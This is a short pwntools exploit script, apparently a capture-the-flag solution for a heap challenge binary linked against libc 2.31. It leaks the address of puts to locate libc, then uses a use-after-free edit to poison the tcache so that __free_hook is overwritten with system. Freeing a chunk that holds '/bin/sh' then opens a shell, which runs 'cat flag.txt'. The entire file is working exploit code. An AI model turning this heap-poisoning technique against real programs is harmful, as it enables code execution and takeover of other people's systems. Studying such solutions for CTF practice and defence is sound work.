from pwn import *

elf = context.binary = ELF('./task')
libc = ELF('./libc-2.31.so')	
# libc = ELF('./libc-2.31-symbols.so')


if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main+182",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)


p.recvuntil(b'puts')
puts = int(p.recvline().decode().split('@')[-1].strip(), 16)
print(f'puts {hex(puts)}')
libc.address = puts - libc.sym['puts']
	
index = 0
def malloc(size, contents):
	global index
	print(f'Requesting {hex(size)} {contents}')
	p.send(b"1")
	p.sendafter(b'Size: ', str(size).encode())
	p.sendafter(b'Data: ', contents)
	p.recvuntil(b'> ')

	index += 1
	return index -1

def free(index, wait=True):
	print(f'Freeing {index}')
	p.send(b"2")
	p.sendafter(b'Index: ', str(index).encode())
	if wait:
		p.recvuntil(b'> ')

def edit(index, contents):
	p.send(b"3")
	p.sendafter(b'Index: ', str(index).encode())
	p.sendafter(b'Data: ', contents)
	p.recvuntil(b'> ')


c1 = malloc(0x18, b'A' * 8)
c2 = malloc(0x18, b'B' * 8)

free(c1)
free(c2)

edit(c2, p64(libc.sym['__free_hook']))

malloc(0x18, b'C' * 8)

c3 = malloc(0x18, p64(libc.sym['system']))

# c4 = malloc(0x100, b'cat flag.txt')
c4 = malloc(0x100, b'/bin/sh')
free(c4, False)

sleep(1)
p.sendline(b"cat flag.txt")
print(p.clean(1.0))

# p.interactive()
